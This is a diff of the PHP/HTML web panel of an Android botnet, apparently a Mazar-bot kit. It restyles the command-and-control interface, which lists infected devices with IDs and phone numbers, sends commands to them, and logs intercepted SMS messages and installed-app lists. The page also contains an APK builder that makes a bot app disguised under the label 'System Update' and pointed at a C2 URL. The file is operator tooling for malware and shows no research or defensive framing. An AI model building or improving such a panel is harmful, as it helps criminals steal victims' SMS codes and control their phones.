@@ -6,118 +6,87 @@ require_once __DIR__ . '/../database.php';
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Management Panel</title>
-    <link rel="stylesheet" href="css/base.css">
-    <link rel="stylesheet" href="css/layout.css">
-    <link rel="stylesheet" href="css/components.css">
-    <link rel="stylesheet" href="css/tables.css">
+    <title>Management Panel</title>
+    <link rel="stylesheet" href="css/modern.css">
 </head>
 <body>
     <div class="container">
         <header>
-            <h1>Device Management Panel</h1>
+            <h1>Command Center</h1>
             <div class="stats">
-                <span id="deviceCount">0</span> Devices | 
-                <span id="onlineCount" class="online">0</span> Online | 
-                <span id="offlineCount" class="offline">0</span> Offline
+                <span>Devices: <b id="deviceCount">0</b></span>
+                <span>Online: <b id="onlineCount" style="color:var(--success)">0</b></span>
+                <span>Offline: <b id="offlineCount" style="color:var(--error)">0</b></span>
             </div>
         </header>
 
         <div class="tabs">
             <button class="tab-button active" onclick="switchTab('devices')">Devices</button>
             <button class="tab-button" onclick="switchTab('logs')">Logs</button>
-            <button class="tab-button" onclick="switchTab('builder')">Builder</button>
+            <button class="tab-button" onclick="switchTab('builder')">APK Builder</button>
         </div>
 
         <div id="devices-tab" class="tab-content active">
-            <div class="toolbar">
-                <div class="search-box">
-                    <input type="text" id="deviceSearch" placeholder="Search devices..." onkeyup="filterDevices()">
+            <div class="card">
+                <div class="toolbar" style="display:flex; justify-content:space-between; margin-bottom:1rem;">
+                    <input type="text" id="deviceSearch" placeholder="Search devices..." onkeyup="filterDevices()" style="max-width:300px">
+                    <div class="actions">
+                        <button onclick="selectAll()" class="btn-primary" style="background:var(--border)">Select All</button>
+                        <button id="sendCommandBtn" onclick="showCommandModal()" class="btn-primary" disabled>Send Command</button>
+                    </div>
                 </div>
-                <div class="actions">
-                    <button onclick="selectAll()" class="btn-secondary">Select All</button>
-                    <button onclick="deselectAll()" class="btn-secondary">Deselect All</button>
-                    <button id="sendCommandBtn" onclick="showCommandModal()" class="btn-primary" disabled>Send Command</button>
+                <div class="table-container">
+                    <table id="devicesTable" style="width:100%; border-collapse:collapse">
+                        <thead>
+                            <tr style="text-align:left; color:var(--text-muted); border-bottom:1px solid var(--border)">
+                                <th style="padding:1rem"><input type="checkbox" id="selectAllCheckbox" onchange="toggleSelectAll()"></th>
+                                <th>ID</th>
+                                <th>Model</th>
+                                <th>Numbers</th>
+                                <th>Status</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody id="devicesTableBody"></tbody>
+                    </table>
                 </div>
             </div>
-            <div class="table-container">
-                <table id="devicesTable">
-                    <thead>
-                        <tr>
-                            <th><input type="checkbox" id="selectAllCheckbox" onchange="toggleSelectAll()"></th>
-                            <th>Android ID</th>
-                            <th>Model</th>
-                            <th>Phone Numbers</th>
-                            <th>Online</th>
-                            <th>Command</th>
-                        </tr>
-                    </thead>
-                    <tbody id="devicesTableBody">
-                    </tbody>
-                </table>
-            </div>
-            <div class="pagination" id="devicesPagination"></div>
         </div>
 
         <div id="logs-tab" class="tab-content">
-            <div class="toolbar">
-                <div class="search-box">
-                    <input type="text" id="logSearch" placeholder="Search logs..." onkeyup="filterLogs()">
-                </div>
-                <div class="filter-box">
-                    <select id="logTypeFilter" onchange="filterLogs()">
-                        <option value="">All Types</option>
-                        <option value="sms_received">SMS Received</option>
-                        <option value="getAppsAll_result">Apps Result</option>
-                        <option value="getSmsInbox_result">SMS Inbox Result</option>
-                    </select>
-                </div>
-            </div>
-            <div class="table-container">
-                <table id="logsTable">
-                    <thead>
-                        <tr>
-                            <th>ID</th>
-                            <th>Android ID</th>
-                            <th>Type</th>
-                            <th>Log</th>
-                            <th>Time</th>
-                        </tr>
-                    </thead>
-                    <tbody id="logsTableBody">
-                    </tbody>
+            <div class="card">
+                <input type="text" id="logSearch" placeholder="Filter logs..." onkeyup="filterLogs()" style="margin-bottom:1rem">
+                <table id="logsTable" style="width:100%">
+                    <tbody id="logsTableBody"></tbody>
                 </table>
             </div>
-            <div class="pagination" id="logsPagination"></div>
         </div>
 
         <div id="builder-tab" class="tab-content">
-            <div class="toolbar">
-                <h2>APK Builder</h2>
-            </div>
-            <div class="form-container" style="max-width: 500px; margin: 20px 0; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
-                <div class="form-group" style="margin-bottom: 15px;">
-                    <label for="apkName" style="display: block; margin-bottom: 5px; font-weight: bold;">APK Filename:</label>
-                    <input type="text" id="apkName" value="ClassicBotMazar" placeholder="e.g. MyBot" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
+            <div class="card" style="max-width: 600px; margin: 0 auto;">
+                <h2 style="margin-top:0">APK Configuration</h2>
+                <div class="form-group">
+                    <label>File Name</label>
+                    <input type="text" id="apkName" value="ClassicBotMazar">
                 </div>
-                <div class="form-group" style="margin-bottom: 15px;">
-                    <label for="appLabel" style="display: block; margin-bottom: 5px; font-weight: bold;">App Name (Label):</label>
-                    <input type="text" id="appLabel" value="System Update" placeholder="e.g. Chrome Update" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
+                <div class="form-group">
+                    <label>App Label</label>
+                    <input type="text" id="appLabel" value="System Update">
                 </div>
-                <div class="form-group" style="margin-bottom: 15px;">
-                    <label for="c2Url" style="display: block; margin-bottom: 5px; font-weight: bold;">C2 URL:</label>
-                    <input type="text" id="c2Url" value="http://<?php echo $_SERVER['HTTP_HOST']; ?>/c2/" placeholder="http://your-domain.com/c2/" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
+                <div class="form-group">
+                    <label>C2 URL</label>
+                    <input type="text" id="c2Url" value="http://<?php echo $_SERVER['HTTP_HOST']; ?>/c2/">
                 </div>
-                <button onclick="buildApk()" id="buildBtn" class="btn-primary" style="width: 100%;">Build APK</button>
+                <button onclick="buildApk()" id="buildBtn" class="btn-primary" style="width:100%">Generate APK</button>
                 
-                <div id="buildStatus" style="margin-top: 20px; display: none;">
-                    <p id="statusMessage" style="font-weight: bold;"></p>
-                    <div id="downloadLink" style="display: none; margin-top: 10px;">
-                        <a id="apkDownloadBtn" href="#" class="btn-secondary" style="display: inline-block; text-decoration: none; text-align: center;">Download APK</a>
+                <div id="buildStatus" style="margin-top: 1.5rem; display: none;">
+                    <p id="statusMessage"></p>
+                    <div id="downloadLink" style="display: none; margin-bottom: 1rem;">
+                        <a id="apkDownloadBtn" href="#" class="btn-primary" style="display:block; text-align:center; background:var(--success); text-decoration:none">Download Build</a>
                     </div>
-                    <details style="margin-top: 15px;">
-                        <summary style="cursor: pointer; color: #666;">View Build Log</summary>
-                        <pre id="buildLog" style="background: #f4f4f4; padding: 10px; border-radius: 4px; font-size: 12px; overflow-x: auto; max-height: 300px;"></pre>
+                    <details>
+                        <summary style="color:var(--text-muted); cursor:pointer">Console Output</summary>
+                        <pre id="buildLog"></pre>
                     </details>
                 </div>
             </div>
